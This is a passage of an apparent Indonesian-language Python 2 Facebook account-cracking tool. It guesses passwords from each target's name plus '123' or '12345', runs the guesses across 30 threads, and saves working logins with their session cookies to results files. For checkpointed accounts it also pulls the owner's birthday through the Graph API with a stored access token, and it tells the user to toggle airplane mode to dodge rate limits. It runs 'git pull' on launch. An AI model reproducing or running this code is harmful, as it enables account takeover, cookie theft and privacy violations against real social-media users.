            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s[+---> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' (s) %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    lalalalaganigani = open('.almiraXjeeck.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,lalalalaganigani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s[+---> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' (c) %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s[+---> %s|%s                %s' % (K,user,pw,N)
                wrt = ' (c) %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def _jeeckgantenggaksenenggakusahrecode_(self):
        ___jeeck___ = raw_input('\n [ >_ ] method : ')
        if ___jeeck___ == '':
            print '\n %s[%s×%s] jangan kosong bro'%(P,B,P);self._jeeckgantenggaksenenggakusahrecode_()
        elif ___jeeck___ in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s!%s] On of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B)
            with JeckoloveAlmira(max_workers=30) as (___jeeck___xxzy___):
            	for jeeckxxz in self.id: 
                    try:
                        uid, name = jeeckxxz.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        ___jeeck___xxzy___.submit(self.__jeeck__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif ___jeeck___ in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s!%s] On of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B)
            with JeckoloveAlmira(max_workers=30) as (___jeeck___xxzy___):
            	for jeeckxxz in self.id: 
                    try:
                        uid, name = jeeckxxz.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        ___jeeck___xxzy___.submit(self.__yayangantenk__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif ___jeeck___ in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s!%s] On of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B)
            with JeckoloveAlmira(max_workers=30) as (___jeeck___xxzy___):
            	for jeeckxxz in self.id: 
                    try:
                        uid, name = jeeckxxz.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        ___jeeck___xxzy___.submit(self.__riskygantenk__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Lebok no seng genah anjink");self._jeeckgantenggaksenenggakusahrecode_()

def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s+%s] Finised Simbf.............'%(P,B,P)
        print '\n\n [%s+%s] total OK : %s%s%s'%(B,P,B,str(len(ok)),P)
        print ' [%s+%s] total CP : %s%s%s'%(P,B,P,str(len(cp)),N);exit()
    else:
        print '\n\n [%s+%s] opshh kamu tidak mendapatkan hasil :('%(P,B);exit()

if __name__ == '__main__':
    os.system('git pull')
    ___jeeck___xnano___xxz___()
    # STOPP RECODE 
